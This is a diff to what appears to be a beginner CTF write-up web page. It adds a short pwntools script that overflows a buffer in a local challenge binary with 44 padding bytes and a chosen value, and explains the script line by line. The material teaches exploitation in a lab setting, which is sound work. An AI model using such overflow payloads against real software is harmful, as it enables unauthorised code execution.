@@ -501,7 +501,25 @@ python3 -m venv venv
 source ./venv/bin/activate
 pip install pwntools
 </code></pre><br>
-					<p class="pr-desc">After this we can start to use pwntools, doing <pre><code>nano ctf1.py</code></pre> will let you start writing to a python file</p>
+					<p class="pr-desc">After this we can start to use pwntools, doing <pre><code>nano ctf1.py</code></pre>  will let you start writing to a python file</p><br>
+										<pre><code class="language-python">
+from pwn import *
+
+p = process("./chal2h")
+
+payload = b"A"*44 + b"\x67\x00\x00\x00"
+
+p.sendline(payload)
+p.interactive()
+</code></pre><br>
+					<p class="pr-desc">Breaking it down line by line here, this code:</p><br>
+					<p class="pr-desc">1. Imports pwntools</p><br>
+					<p class="pr-desc">2. Runs ./chal2h in your terminal to start the challenge</p><br>
+					<p class="pr-desc">3. Sets a command you want to run which in this case is b"A"*44 + b"\x67\x00\x00\x00" the reason for these b's and the \x67\x00 etc. is because b denotes the text as "raw" or in byte format, and the \x67\x00 etc. writes to each individual byte.</p><br>
+					<p class="pr-desc">4. Sends the command you just denoted</p><br>
+					<p class="pr-desc">5. Accesses the code and you can see the result, essentially if you were correct or not</p><br>
+					<p class="pr-desc">Since you've written the code  <pre><code>python3 ctf1.py</code></pre>  should show that you have properly completed this CTF :)</p> 
+					
 					
 					<div class="tag-list">
 						<p class="tag">PWNTOOLS</p>
@@ -509,7 +527,7 @@ pip install pwntools
 						<p class="tag">BINARY NINJA</p>
 					</div>
 					<br>
-					<p><a href="" target="_blank">[CTF File]</a></p>
+					<p><a href="" target="https://ashgreytray.github.io./ctf-assets/chal2h">[CTF File]</a></p>
 				</li>
 			</ul>
 		</div>
@@ -643,6 +661,7 @@ pip install pwntools
 </body>
 
 </html>
+
 
 
 
